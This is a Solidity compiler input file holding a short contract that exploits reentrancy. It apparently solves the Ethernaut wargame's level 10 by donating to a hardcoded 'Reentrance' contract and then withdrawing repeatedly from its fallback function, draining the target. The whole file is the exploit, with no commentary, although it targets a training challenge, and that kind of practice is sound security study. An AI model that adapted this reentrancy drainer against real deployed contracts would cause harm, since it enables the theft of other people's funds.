{
  "language": "Solidity",
  "sources": {
    "contracts/Ethernaut10.sol": {
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface IReentrance {\n    function donate(address _to) external payable;\n\n    function withdraw(uint _amount) external;\n}\n\ncontract Ethernaut10 {\n    IReentrance reentrance =\n        IReentrance(0x722e79Ec73dc11070f9f668B1d30b19438D0c8fb);\n    uint256 val;\n\n    constructor() {}\n\n    function start() public payable {\n        reentrance.donate{value: msg.value}(address(this));\n        val = msg.value;\n        reentrance.withdraw(val);\n    }\n\n    fallback() external payable {\n        reentrance.withdraw(val);\n    }\n}\n"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "abi",
          "evm.bytecode",
          "evm.deployedBytecode",
          "evm.methodIdentifiers",
          "metadata",
          "devdoc",
          "userdoc",
          "storageLayout",
          "evm.gasEstimates"
        ],
        "": [
          "ast"
        ]
      }
    },
    "metadata": {
      "useLiteralContent": true
    }
  }
}